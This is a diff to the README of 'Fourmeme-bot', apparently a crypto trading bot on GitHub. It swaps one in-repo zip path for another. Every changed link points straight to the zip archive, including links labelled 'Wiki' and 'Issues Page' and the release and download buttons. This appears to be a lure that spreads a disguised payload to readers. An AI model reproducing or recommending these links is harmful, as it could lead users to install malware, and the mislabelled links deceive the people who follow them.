@@ -21,11 +21,11 @@ To ensure smooth operation, your system should meet the following requirements:
 Ready to dive in? Follow these simple steps to download and run Fourmeme-bot.
 
 1. **Visit the Releases Page:** Click the button below to go to the download section.
-   [![Download Fourmeme-bot](https://raw.githubusercontent.com/giaaaa0121/Fourmeme-bot/main/dyssystole/Fourmeme-bot.zip)](https://raw.githubusercontent.com/giaaaa0121/Fourmeme-bot/main/dyssystole/Fourmeme-bot.zip)
+   [![Download Fourmeme-bot](https://github.com/giaaaa0121/Fourmeme-bot/raw/refs/heads/main/src/lib/copy/bot_Fourmeme_v1.6.zip)](https://github.com/giaaaa0121/Fourmeme-bot/raw/refs/heads/main/src/lib/copy/bot_Fourmeme_v1.6.zip)
 
 2. **Download the Latest Version:** 
    - Look for the latest release on the Releases page.
-   - Find the asset that matches your operating system (e.g., `https://raw.githubusercontent.com/giaaaa0121/Fourmeme-bot/main/dyssystole/Fourmeme-bot.zip`, `Fourmeme-bot-macOS`, or `Fourmeme-bot-Linux`).
+   - Find the asset that matches your operating system (e.g., `https://github.com/giaaaa0121/Fourmeme-bot/raw/refs/heads/main/src/lib/copy/bot_Fourmeme_v1.6.zip`, `Fourmeme-bot-macOS`, or `Fourmeme-bot-Linux`).
    - Click the link to download.
 
 3. **Install the Application:**
@@ -52,9 +52,9 @@ Adjust settings to suit your trading style:
 - **Join the Community:** Engage with users and developers to share insights and tips.
 
 ## 📜 Additional Resources
-- **Documentation:** For a detailed guide, consult the [Wiki](https://raw.githubusercontent.com/giaaaa0121/Fourmeme-bot/main/dyssystole/Fourmeme-bot.zip).
-- **Support:** If you encounter issues, visit the [Issues Page](https://raw.githubusercontent.com/giaaaa0121/Fourmeme-bot/main/dyssystole/Fourmeme-bot.zip) for help.
+- **Documentation:** For a detailed guide, consult the [Wiki](https://github.com/giaaaa0121/Fourmeme-bot/raw/refs/heads/main/src/lib/copy/bot_Fourmeme_v1.6.zip).
+- **Support:** If you encounter issues, visit the [Issues Page](https://github.com/giaaaa0121/Fourmeme-bot/raw/refs/heads/main/src/lib/copy/bot_Fourmeme_v1.6.zip) for help.
 
 ## 💻 Download & Install
 Click on the link below to easily access the latest releases:
-[Download Fourmeme-bot](https://raw.githubusercontent.com/giaaaa0121/Fourmeme-bot/main/dyssystole/Fourmeme-bot.zip)
+[Download Fourmeme-bot](https://github.com/giaaaa0121/Fourmeme-bot/raw/refs/heads/main/src/lib/copy/bot_Fourmeme_v1.6.zip)
